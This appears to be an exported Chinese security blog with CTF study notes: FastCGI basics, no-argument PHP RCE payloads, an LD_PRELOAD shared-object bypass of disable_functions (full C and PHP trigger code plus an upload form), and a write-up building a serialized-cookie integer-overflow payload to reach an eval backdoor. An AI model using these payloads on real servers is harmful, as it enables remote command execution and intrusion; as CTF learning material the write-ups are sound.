<p>FastCGI是和语言无关的、可伸缩架构的CGI开放扩展，其主要行为是将CGI解释器进程保持在内存中，并因此获得较高的性能。众所周知，CGI解释器的反复加载是CGI性能低下的主要原因，如果CGI解释器保持在内存中，并接受FastCGI进程管理器调度，则可以提供良好的性能、伸缩性、Fail- Over特性等等。</p>
<p><strong>举例：</strong></p>
<p>当web server收到/index.php请求，看一下CGI程序和FastCGI程序分别是怎么处理的：</p>
<p><strong>CGI：</strong>当收到web server请求后，会启动对应的CGI程序，这里就是PHP的解析器（php-cgi）。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定的CGI规定的格式返回处理后的结果，退出进程。（CGI每次接收到请求都会执行这些步骤）</p>
<p><strong>FastCGI：</strong>首先，FastCGI程序会先启动一个master，解析配置环境，初始化执行环境，然后再启动多个worker。当请求过来时，master会传递给一个worker，然后立即可以接受下一个请求。这样就避免了重复的劳动，效率自然是高。而且当worker不够用时，master可以根据配置预先启动几个worker等着；当然空闲worker太多时，也会停掉一些，这样就提高了性能，也节约了资源，这就是fastcgi对进程的管理。（CGI程序和FastCGI程序，可以理解成遵循CGI协议和FastCGI协议编写的程序）</p>
<p>FastCGI的工作原理：</p>
<p>FastCGI接口方式采用C/S结构，可以将HTTP服务器和脚本解析服务器分开，同时在脚本解析服务器上启动一个或者多个脚本解析守护进程。当HTTP服务器每次遇到动态程序时，可以将其直接交付给FastCGI进程来执行，然后将得到的结果返回给浏览器。这种方式可以让HTTP服务器专一地处理静态请求，或者将动态脚本服务器的结果返回给客户端，这在很大程度上提高了整个应用系统的性能。 </p>
<p><img src="C:/Users/86132/AppData/Roaming/Typora/typora-user-images/image-20220426143223300.png" alt="image-20220426143223300"></p>
<p>（1）Web Server启动时载入FastCGI进程管理器（Apache Module或IIS ISAPI等)</p>
<p>（2）FastCGI进程管理器自身初始化，启动多个CGI解释器进程(可建多个php-cgi)，并等待来自Web Server的连接。</p>
<p>（3）当客户端请求到达Web Server时，FastCGI进程管理器选择并连接到一个CGI解释器。Web server将CGI环境变量和标准输入发送到FastCGI子进程php-cgi。</p>
<p>（4）FastCGI子进程完成处理后，将标准输出和错误信息从同一连接返回Web Server。当FastCGI子进程关闭连接时，请求便告处理完成。FastCGI子进程接着等待，并处理来自FastCGI进程管理器(运行在Web Server中)的下一个连接。在CGI模式中，php-cgi在此便退出了。</p>
<p>自己总结的fastcgi工作进程</p>
<p>1.服务器启动 初始化fastcgi管理器</p>
<p>2.fastcgi管理器自身初始化 创建多个fastcgi子进程 比如php-cgi/php-FPM</p>
<p>3.客户端发送请求 比如index.php 服务端收到请求后由fastcgi管理器选择一个子进程（php-cgi）并传输解析index.php所需的环境及变量等</p>
<p>4.子进程php-cgi进行环境配置并解析</p>
<p>5.子进程php-cgi将解析后的输出以及报错结果返回服务端 服务端返回客户端进行回显</p>
<p>6.子进程php-cgi结束进程 断开与fastcgi的连接 停止工作 fastcgi管理器接受下一个服务端请求 并再次执行以上操作 </p>
<p>可以发现如果有较多请求同时处理 因为有很多php-cgi 所以服务端不会因请求量过大而崩溃 这就是fastcgi多进程的号出 但采取了空间换时间的方法 消耗了更多的服务器内存</p>
<p>CGI与FastCGI比较：</p>
<p>（1）对于CGI来说，每一个Web请求PHP都必须重新解析php.ini、重新载入全部扩展，并重新初始化全部数据结构。而使用FastCGI，所有这些都只在进程启动时发生一次。一个额外的好处是，持续数据库连接(Persistent database connection)可以工作。</p>
<p>（2）由于FastCGI是多进程，所以比CGI多线程消耗更多的服务器内存，php-cgi解释器每进程消耗7至25兆内存，将这个数字乘以50或100就是很大的内存数。<br>再放一个p牛的利用fpm的一个漏洞<br><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写 | 离别歌 (leavesongs.com)</a></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>CGI</tag>
      </tags>
  </entry>
  <entry>
    <title>无参rce总结</title>
    <url>/2022/06/09/%E6%97%A0%E5%8F%82rce%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="无参RCE"><a href="#无参RCE" class="headerlink" title="无参RCE"></a>无参RCE</h1><p><strong>之前假期做题的时候做到过一次无参rce 但是当时水平不太够很多地方都看不懂 今天正好又遇到了就总结一下</strong></p>
<h2 id="什么是无参RCE"><a href="#什么是无参RCE" class="headerlink" title="什么是无参RCE"></a>什么是无参RCE</h2><p>先看一段正则</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123; </span><br><span class="line"> 		     <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>看着很乱 一点点分析一下</strong></p>
<p><strong>最外层的引号和一对//就不多说了 正则表达的框架</strong></p>
<h6 id="W-W-表示除了-数字字母下划线-以外的字符-前面有个-表示对该结果集进行取反-也就是数字字母下划线-等同于-w-这里注意-这个符号在-外面表示正则开始的位置-而在-里面则表示对后面的正则结果进行去反-也就是取补集"><a href="#W-W-表示除了-数字字母下划线-以外的字符-前面有个-表示对该结果集进行取反-也就是数字字母下划线-等同于-w-这里注意-这个符号在-外面表示正则开始的位置-而在-里面则表示对后面的正则结果进行去反-也就是取补集" class="headerlink" title="[^/W]  ==/W==表示除了 数字字母下划线 以外的字符 前面有个==^==表示对该结果集进行取反 也就是数字字母下划线 等同于/w 这里注意==^== 这个符号在[]外面表示正则开始的位置 而在[]里面则表示对后面的正则结果进行去反 也就是取补集"></a><strong>[^/W]</strong>  ==/W==表示除了 数字字母下划线 以外的字符 前面有个==^==表示对该结果集进行取反 也就是数字字母下划线 等同于/w 这里注意==^== 这个符号在[]外面表示正则开始的位置 而在[]里面则表示对后面的正则结果进行去反 也就是取补集</h6><p><strong><code>+</code>  量词 表示前面的正则匹配一次或多次 那么<code>[^/W]+</code>就表示匹配多个数字字母下划线 如果没有+ 那么匹配的只有一个字节 比如   <code>a    b   _    1</code>       有了+量词之后 就可以匹配单词或多个字节组成的词  比如<code>y1zh3e7</code></strong></p>
<p><strong>\  转义符 不要因为正则太复杂懵了 后面的转义也是 也就是说明这对括号==(==<code>(?R)?\</code>==)== 就是一对括号 没别的意思 注意这对括号里的正则是作用在这个括号里 后面提到的递归也就是对括号里的内容进行递归匹配</strong> </p>
<p><strong>(?R)   这个地方比较难理解 可以直接记住 (?R)是整个正则表达式 也就是<code>[^\W]+\((?R)?\)</code></strong> </p>
<p><strong>?        代表将前面的正则进行贪婪匹配 看一下前面的正则是什么 (?R) 是整个正则表达式 也就是再次进行相同的匹配 也就是递归</strong></p>
<p><strong>那么梳理一下逻辑 前面的<code>[^/W]</code>代表可以输一个词组 后面的括号里不能输入任何数字字母下划线 也就是说exp的赋值只能是一个没有参数的函数 所以这里就引出了无参RCE</strong></p>
<p><strong>举个例子 exp 可以是 <code>a(b(c()d()))</code></strong> </p>
<p><strong>这里有人可能会问了 这个<code>a()</code> 里面难道不是有<code>b(c()d())</code> 吗 同理b也是 为什么可以绕过呢</strong></p>
<p><strong>首先我们要明确一个点 正则匹配是从左到右对参数进行匹配 并且只有在一个完整的匹配后才会继续进行匹配 那么上面这个参数中 第一个完整的匹配是哪个呢 应该是<code>c()</code> 而第二个应该是<code>d()</code>  因为匹配到这里的时候a和b的右面的一半括号还没有匹配到 也就是说现在匹配到的a和b其实是 <code>a(</code> 和  <code>b(</code>  并不是一个完整的正则  所以先替换为空的就是<code>c()和d()</code> 最终不断递归把a也吃掉了 所以绕过的方法就是使用php中的无参函数进行绕过</strong></p>
<h2 id="姿势1-amp-姿势2"><a href="#姿势1-amp-姿势2" class="headerlink" title="姿势1&amp;姿势2"></a>姿势1&amp;姿势2</h2><h3 id="getallheaders-amp-get-defined-vars"><a href="#getallheaders-amp-get-defined-vars" class="headerlink" title="getallheaders()&amp;get_defined_vars()"></a>getallheaders()&amp;get_defined_vars()</h3><p><strong>getallheaders 这个函数有一些限制条件 必须是服务器为apache时才可以使用 它可以以数组形式返回http头 那么我们在burp中通过增加或修改请求头的方式就可以返回一些恶意构造的代码 如果这时程序中正好有一个可用的后门 就可以直接执行</strong></p>
<p><strong>get_defined_vars() 与上一个类似 但是没有了apache的局限条件 它可以获取的四个全局变量<code>$_GET $_POST $_FILES $_COOKIE</code>，而它的返回值是一个二维数组 我们利用<code>GET</code>方式传入的参数在第一个数组中 这里我们就需要先将二维数组转换为一维数组 这里我们用到<code>current()</code>函数 这个函数的作用是返回数组中的当前单元 而它的默认是第一个单元 也就是我们GET方式传入的参数 所以局限性就是只能在get传参时和current()搭配使用</strong></p>
<h2 id="姿势3"><a href="#姿势3" class="headerlink" title="姿势3"></a>姿势3</h2><h2 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a>session_id()</h2><p><strong>原理是通过highlight_file进行源码读取 如果该文件代码包含了flag文件 那么就可以直接读取flag了</strong></p>
<p><strong>首先 由于php并不会自动开启session 所以要自己开启一个session对话</strong> </p>
<p><strong>session_start()</strong></p>
<p><strong>这个方法的可控参数是Cookie中的SESSID 当session_start 后就会产生一个SESSID  在包文中可以我们自己进行修</strong>改</p>
<p><strong>payload: <code>highlight_file(session_id(session_start))</code></strong></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>以上就是对无参rce的总结 不同环境应用的函数不同 从本质上来说就是应用无参函数进行rce</strong></p>
<p><strong>详细例子移步<a href="https://www.cnblogs.com/pursue-security/p/15406272.html#_label1_1">RCE篇之无参数rce - 学安全的小白 - 博客园 (cnblogs.com)</a></strong></p>
]]></content>
      <categories>
        <category>Web</category>
        <category>php</category>
      </categories>
      <tags>
        <tag>标签2</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>绕过disable_functions</title>
    <url>/2022/07/11/%E7%BB%95%E8%BF%87disable-functions/</url>
    <content><![CDATA[<h2 id="绕过disable-functions"><a href="#绕过disable-functions" class="headerlink" title="绕过disable_functions"></a>绕过disable_functions</h2><h2 id="概括"><a href="#概括" class="headerlink" title="概括"></a>概括</h2><p>最主流的方式有两种</p>
<ul>
<li><p>利用LD_PRELOAD：</p>
<ol>
<li><p>劫持并覆盖系统函数 调用某一可触发该系统函数时的进程时 编译并运行已经被恶意payload覆盖过的系统函数</p>
</li>
<li><p>利用gcc的attribute机制 使得进程在进行时就触发某一函数 该函数可以是自己编写的恶意函数（如反弹shell等）</p>
<p>将该函数编译为恶意so后 通过putenv函数将该恶意函数压入到环境变量LD_PRELOAD中 使该恶意so文件在程序运行时就可以成功触发并利用</p>
</li>
</ol>
</li>
<li><p>如果网站开启了php的fastcgi 也就是php-fpm 就可以利用fpm的被动模式在自己的vps上建立一个 </p>
</li>
</ul>
<h2 id="TKCTF-白给的shell"><a href="#TKCTF-白给的shell" class="headerlink" title="TKCTF 白给的shell"></a>TKCTF 白给的shell</h2><p>这道题用LD_PRELOAD绕过一下</p>
<p>写个恶意y1.c并编译成y1.so</p>
<figure class="highlight c"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span>** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">preload</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// get command line options and arg</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* cmdline = getenv(<span class="string">&quot;EVIL_CMDLINE&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// unset environment variable LD_PRELOAD.</span></span><br><span class="line">    <span class="comment">// unsetenv(&quot;LD_PRELOAD&quot;) no effect on some </span></span><br><span class="line">    <span class="comment">// distribution (e.g., centos), I need crafty trick.</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">&quot;LD_PRELOAD&quot;</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// executive command</span></span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译</p>
<figure class="highlight shell"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC y1.c -o y1.so</span><br></pre></td></tr></table></figure>

<p><img src="http://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207111502948.png" alt="image-20220711150235912"></p>
<p>题目环境没有上传点 写一个表单上传一下文件 由于php上传临时文件上传后就删除的特性 所以要写一个保存函数保存我们的恶意文件</p>
<p>表单</p>
<figure class="highlight html"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://39.96.12.202:40001/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;0&quot;</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>用来触发so文件的php脚本</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="variable">$out_path</span> = <span class="variable">$_GET</span>[<span class="string">&quot;outpath&quot;</span>];</span><br><span class="line"><span class="variable">$evil_cmdline</span> = <span class="variable">$cmd</span> . <span class="string">&quot; &gt; &quot;</span> . <span class="variable">$out_path</span> . <span class="string">&quot; 2&gt;&amp;1&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot;</span> . <span class="variable">$evil_cmdline</span> . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;EVIL_CMDLINE=&quot;</span> . <span class="variable">$evil_cmdline</span>);    <span class="comment">// 通过环境变量 EVIL_CMDLINE 向 bypass_disablefunc_x64.so 传递具体执行的命令行信息</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$so_path</span> = <span class="variable">$_GET</span>[<span class="string">&quot;sopath&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=&quot;</span> . <span class="variable">$so_path</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="comment">// error_log(&quot;&quot;, 1, &quot;&quot;, &quot;&quot;);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot;</span> . <span class="title function_ invoke__">nl2br</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$out_path</span>)) . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="variable">$out_path</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>后门传值函数</p>
<p><img src="http://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207111504097.png" alt="image-20220711150436066"></p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;/tmp/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br></pre></td></tr></table></figure>

<p>上传成功</p>
<p><img src="http://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207111451132.png" alt="image-20220711145113065"></p>
<p>源码里有三个值需要接受 利用后门包含php脚本 再利用php脚本触发恶意so 成功</p>
<p><img src="http://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207111507461.png" alt="image-20220711150722389"></p>
<p>这里本来有个suid提权的 感谢善良的出题人取消了这一步 成功拿到flag</p>
<p><img src="http://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207111508958.png" alt="image-20220711150845897"></p>
<h2 id="利用php-fpm进行攻击"><a href="#利用php-fpm进行攻击" class="headerlink" title="利用php-fpm进行攻击"></a>利用php-fpm进行攻击</h2><p>这里用buuctf上的一道题演示 移步下面连接</p>
<p><a href="https://y1zh3e7.github.io/2022/04/24/%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/">蓝帽杯 2021 One Pointer PHP - y1zh3e7</a></p>
]]></content>
      <categories>
        <category>网安</category>
      </categories>
      <tags>
        <tag>LD_PRELOAD</tag>
        <tag>绕过diasble_functions</tag>
      </tags>
  </entry>
  <entry>
    <title>蓝帽杯 2021 One Pointer PHP</title>
    <url>/2022/04/24/%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/</url>
    <content><![CDATA[<p>打开题拿源码 </p>
<p>add_api.php</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">	<span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">		<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;data&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$user</span>=<span class="keyword">new</span> <span class="title class_">User</span>;</span><br><span class="line">	<span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line">	<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;data&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>user.php</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="第一个点-php数组溢出"><a href="#第一个点-php数组溢出" class="headerlink" title="第一个点 php数组溢出"></a>第一个点 php数组溢出</h3><p>审计源码 想执行backdoor 第一个if可以不用管 这里注意是=赋值运算符 不是==比较运算符</p>
<p>第五行由于给$count[]赋值为1 永真 要让if条件为假才能进入eval</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">	<span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">		<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;data&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>PHP的int型数据取值范围，与操作系统相关，32位系统上为2的31次方，即-2147483648到2147483647，64位系统上为2的63次方，即-9223372036854775808到9223372036854775807。当key等于PHP int类型数据的最大值时，想要再插入一个更大的值便会造成溢出导致出现Warning</p>
<p>并且php数组还有一个特性 如果数组键名为空 那么就在已有键名自增一次作为键名 如果自增结果大于int上限值 赋值就会失败</p>
<p><img src="C:/Users/86132/AppData/Roaming/Typora/typora-user-images/image-20220424214731896.png" alt="image-20220424214731896"></p>
<p><img src="https://s2.loli.net/2022/04/24/5jOXeQmIwdDh1Up.png" alt="image-20220424215012644"></p>
<p>所以这里的键名要为9223372036854775807 也就是说$user-&gt;count要为9223372036854775806</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>这里可以通过修改$_COOKIE[data]的值来修改$user 的类变量</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))</span><br></pre></td></tr></table></figure>

<p>构造payload</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$count</span>=<span class="number">9223372036854775806</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">//O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D</span></span><br></pre></td></tr></table></figure>

<p>修改Cookie为  </p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">data = O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>User%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>count%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A9223372036854775806%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>

<p>在源码页面构造个phpinfo()看一下 成功绕过</p>
<p><img src="https://s2.loli.net/2022/04/24/kge6nv1tZl3FOAN.png" alt="image-20220424215950164"></p>
<h3 id="第二个点-绕过open-basedir"><a href="#第二个点-绕过open-basedir" class="headerlink" title="第二个点 绕过open basedir"></a>第二个点 绕过open basedir</h3><p>在php.ini中可以通过设置open basedir来限制访问权限 放个学习连接</p>
<p><a href="https://www.cnblogs.com/LLeaves/p/13210005.html">Open_basedir绕过 - LLeaves - 博客园 (cnblogs.com)</a></p>
<p>绕过的方法很多 这里用glob伪协议绕一下 </p>
<p>再放个过程中可能会看到的东西</p>
<p><a href="https://shipengliang.com/program-code/php-directoryiterator%E9%81%8D%E5%8E%86%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%8B%E5%85%A8%E9%83%A8%E6%96%87%E4%BB%B6.html">PHP-DirectoryIterator遍历目录文件夹下全部文件 | 时鹏亮的Blog (shipengliang.com)</a></p>
